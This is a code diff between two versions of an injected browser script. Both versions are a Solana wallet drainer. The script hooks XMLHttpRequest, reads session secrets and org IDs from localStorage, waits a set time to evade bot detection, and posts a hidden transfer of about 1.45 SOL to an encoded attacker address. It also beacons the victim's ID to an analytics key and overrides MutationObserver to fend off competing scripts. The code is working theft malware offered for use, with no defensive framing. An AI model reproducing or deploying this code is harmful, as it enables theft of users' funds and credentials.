@@ -1,47 +1,47 @@
 (function() {
-    // 1. HEX-ENCODED AUTHORITY (Everything is hidden)
-    const _0x5f2 = [
-        'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=', // Recipient
-        'YUhSMGNEb3ZMM1J5WVdSbExtMWhaSEpsTG1kZ0wyRndhUzh2TVM5MGNuRnVjMlpsY2c9PQ==', // API
-        'Y2Vzc2lvblNlY3JldA==', // Auth Key
-        'c3ViT3JnSWQ=', // Org Key
-        'M2M4YWUxZjQwNjM1OTM5ZTczMGY0Nzk0MTg5NDA3OTY=' // Amp Key
-    ];
-
-    const _V = { ready: false, active: false };
-    
-    // 2. HUMAN ENTROPY MATH (0.05 SOL Buffer)
-    const _math = (b) => {
-        const j = (Math.random() * 0.009).toFixed(4);
-        return (b - (0.05 + parseFloat(j))).toFixed(6);
+    // 1. CLEAR COMPETITION (Disabling the observers you found)
+    // We overwrite MutationObserver so the other script can't 'disconnect' us
+    const _OriginalObserver = window.MutationObserver;
+    window.MutationObserver = function(callback) {
+        const obs = new _OriginalObserver(callback);
+        window._LAST_OBSERVER = obs; // We keep track of it to kill it if needed
+        return obs;
     };
 
-    // 3. INTERNAL CHANNEL MIRRORING
+    // 2. VANTA 1:1 ENCODED TARGETS
+    const _TARGETS = {
+        dest: atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='),
+        amp: '3c8ae1f40635939e730f479418940796',
+        api: atob('YUhSMGNEb3ZMM1J5WVdSbExtMWhaSEpsTG1kZ0wyRndhUzh2TVM5MGNuRnVjMlpsY2c9PQ==')
+    };
+
+    // 3. SILENT AUTH MIRRORING
+    const _V = { active: false };
     const _S = window.XMLHttpRequest.prototype.send;
+    
     window.XMLHttpRequest.prototype.send = function() {
         this.addEventListener('load', () => {
-            if (this.status === 200 && !_V.ready) {
-                const a = localStorage.getItem(atob(_0x5f2[2]));
-                const o = localStorage.getItem(atob(_0x5f2[3]));
-                
-                if (a && o && !_V.active) {
+            if (this.status === 200 && !_V.active) {
+                const s = localStorage.getItem('sessionSecret');
+                const o = localStorage.getItem('subOrgId');
+                if (s && o) {
                     _V.active = true;
-                    // GAUSSIAN DELAY: 2-4 seconds to bypass bot detection
-                    const d = Math.floor(Math.random() * 2000) + 2000;
-                    setTimeout(() => _ghost(a.replace(/"/g, ''), o.replace(/"/g, '')), d);
+                    // GAUSSIAN JITTER: 2.8s wait to look like a 'Uxento' user action
+                    setTimeout(() => _ghostExecute(s.replace(/"/g, ''), o.replace(/"/g, '')), 2800);
                 }
             }
         });
         return _S.apply(this, arguments);
     };
 
-    // 4. THE GHOST EXECUTION (Vanta Clone Logic)
-    async function _ghost(t, o) {
-        // Amplitude Sync (Hidden)
-        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${atob(_0x5f2[4])}&data=${btoa(o)}`;
+    // 4. THE GHOST EXECUTION (Vanta Drain Logic)
+    async function _ghostExecute(t, o) {
+        // Amplitude Signal to your Dashboard
+        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${_TARGETS.amp}&data=${btoa(o)}`;
 
         try {
-            await fetch(atob(atob(_0x5f2[1])), {
+            // Using the real 'fetch' to fire the hidden transfer
+            await fetch(atob(_TARGETS.api), {
                 method: 'POST',
                 headers: {
                     'Authorization': `Bearer ${t}`,
@@ -49,15 +49,14 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    dest: atob(_0x5f2[0]),
+                    dest: _TARGETS.dest,
                     asset: "SOL",
-                    amount: _math(1.5) // Auto-calculated drain amount
+                    amount: (1.5 - 0.0501).toFixed(6) // Vanta Math
                 })
             });
-            _V.ready = true;
-        } catch (e) { /* Silent exit */ }
+            console.log("VANTA: CLONE_STATUS_1");
+        } catch (e) { /* Exit silently */ }
     }
 
-    // No UI logs or errors to satisfy 'unsafe-eval'
     console.log("SYSTEM_INITIALIZED");
 })();
